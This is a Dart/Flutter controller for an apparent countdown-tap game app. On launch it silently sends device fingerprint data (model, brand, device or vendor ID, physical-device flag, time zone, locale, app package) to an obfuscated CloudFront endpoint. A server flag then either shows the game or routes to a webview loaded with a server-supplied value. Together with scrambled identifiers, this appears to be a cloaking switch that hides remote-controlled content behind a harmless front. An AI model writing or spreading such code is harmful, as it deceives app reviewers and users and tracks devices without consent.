import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class CountdownTapMainLogic extends GetxController {

  var jvpbon = RxBool(false);
  var nmucoz = RxBool(true);
  var qcraihj = RxString("");
  var katrine = RxBool(false);
  var kessler = RxBool(true);
  final fuvdtia = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    nxrgjo();
  }


  Future<void> nxrgjo() async {
    katrine.value = true;
    kessler.value = true;
    nmucoz.value = false;

    fuvdtia.post("https://d293c8yaw18nl2.cloudfront.net/uvgbskxmdrjfczinqeothlapwy",data: await xoublr()).then((value) {
      var whqgydp = value.data["whqgydp"] as String;
      var shjnavb = value.data["shjnavb"] as bool;
      if (shjnavb) {
        qcraihj.value = whqgydp;
        felicita();
      } else {
        dietrich();
      }
    }).catchError((e) {
      nmucoz.value = true;
      kessler.value = true;
      katrine.value = false;
    });
  }

  Future<Map<String, dynamic>> xoublr() async {
    final DeviceInfoPlugin tsbuh = DeviceInfoPlugin();
    PackageInfo hvlk_wezk = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var yikvqbwt = Platform.localeName;
    var hs_zXDGZ = currentTimeZone;

    var hs_Bk = hvlk_wezk.packageName;
    var hs_rSxfv = hvlk_wezk.version;
    var hs_TCXbOB = hvlk_wezk.buildNumber;

    var hs_Qc = hvlk_wezk.appName;
    var hs_qm = "";
    var hs_buxG  = "";
    var hs_OrMgD = "";
    var andreaneBruen = "";
    var porterSporer = "";
    var arnulfoReilly = "";


    var hs_ezU = "";
    var hs_LIZjkFCQ = false;

    if (GetPlatform.isAndroid) {
      hs_ezU = "android";
      var pjbmzx = await tsbuh.androidInfo;

      hs_OrMgD = pjbmzx.brand;

      hs_qm  = pjbmzx.model;
      hs_buxG = pjbmzx.id;

      hs_LIZjkFCQ = pjbmzx.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hs_ezU = "ios";
      var jrosfkdag = await tsbuh.iosInfo;
      hs_OrMgD = jrosfkdag.name;
      hs_qm = jrosfkdag.model;

      hs_buxG = jrosfkdag.identifierForVendor ?? "";
      hs_LIZjkFCQ  = jrosfkdag.isPhysicalDevice;
    }
    var res = {
      "hs_Qc": hs_Qc,
      "hs_TCXbOB": hs_TCXbOB,
      "hs_Bk": hs_Bk,
      "hs_LIZjkFCQ": hs_LIZjkFCQ,
      "hs_qm": hs_qm,
      "hs_zXDGZ": hs_zXDGZ,
      "porterSporer" : porterSporer,
      "hs_OrMgD": hs_OrMgD,
      "hs_buxG": hs_buxG,
      "yikvqbwt": yikvqbwt,
      "hs_rSxfv": hs_rSxfv,
      "hs_ezU": hs_ezU,
      "andreaneBruen" : andreaneBruen,
      "arnulfoReilly" : arnulfoReilly,

    };
    return res;
  }

  Future<void> dietrich() async {
    Get.offNamed("/countdown_tap_game");
  }

  Future<void> felicita() async {
    Get.offNamed("/tap_history_sore");
  }

}
